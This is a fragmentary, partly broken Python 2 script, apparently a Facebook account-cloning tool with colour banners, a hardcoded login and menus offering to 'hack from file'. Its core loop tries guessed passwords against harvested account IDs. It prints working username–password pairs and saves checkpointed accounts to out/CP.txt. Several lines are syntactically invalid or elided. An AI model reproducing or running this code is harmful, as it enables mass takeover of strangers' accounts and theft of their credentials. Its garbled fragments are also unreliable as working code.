...
jalan("\033[1;97m•◈•───────•◈ FF DKING SKYE •◈•───────•◈•")  

 
jalan("   \033[1;91m Asalam o alikum everone ")	
jalan("   \033[1;91m Wifi users use any vpn  ")	

jalan("   \033[1;93m Welcome to ff dking ")

jalan("\033[1;97m•◈•──────────•◈•\033[1;96mdaking\033[1;96m•◈•──────────•◈•")

CorrectUsername = "ffdking"
CorrectPassword = "ffdking"
...
while (loop == 'true'):
    ...
    if (username == ):
        ...
        if (password == ):
            print "Logged in successfully as " + BOT LOVE HACKER
            loop = 'false'
        else:
            print "Wrong Password"
            os.system('xdg-open https://https://youtu.be/rhy8S_qUO3s')
    else:
...
def login():
	...
	try:
		...
		if 'checkpoint' in url:
			print("\n\033[1;97m[!] Your Account is open")
...
def menu():
	...
	print "\033[1;32;40m[2] \033[1;33;40m══Update Devil"																														
...
def super():
	...
	print "\x1b[1;32;40m[4] \033[1;33;40m══Hack From Fille"
...
def pilih_super():
	...
	if peak =="":
		...
		jalan('\033[1;97m[✺] Hacking start getting ids \033[1;97m...')
	...
	jalan('                    \033[1;97mDking start cloning Wait...')
	print  "  \033[1;36;48m ●💋══════════════════◄►══════════════════💋●" 
								...
								if 'www.facebook.com' in q["error_msg"]:
									...
									if 'access_token' in q:
										...
										if 'www.facebook.com' in q["error_msg"]:
											...
											q = json.load(data)
											if 'access_token' in q:
												print '\033[1;97m[Login Now] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass8 + ' 👽 ' + b['name']
												oks.append(user+pass8)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\x1b[1;36;40m[After24Hr] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass8 + ' 👽 ' + b['name']
													cek = open("out/CP.txt", "a")
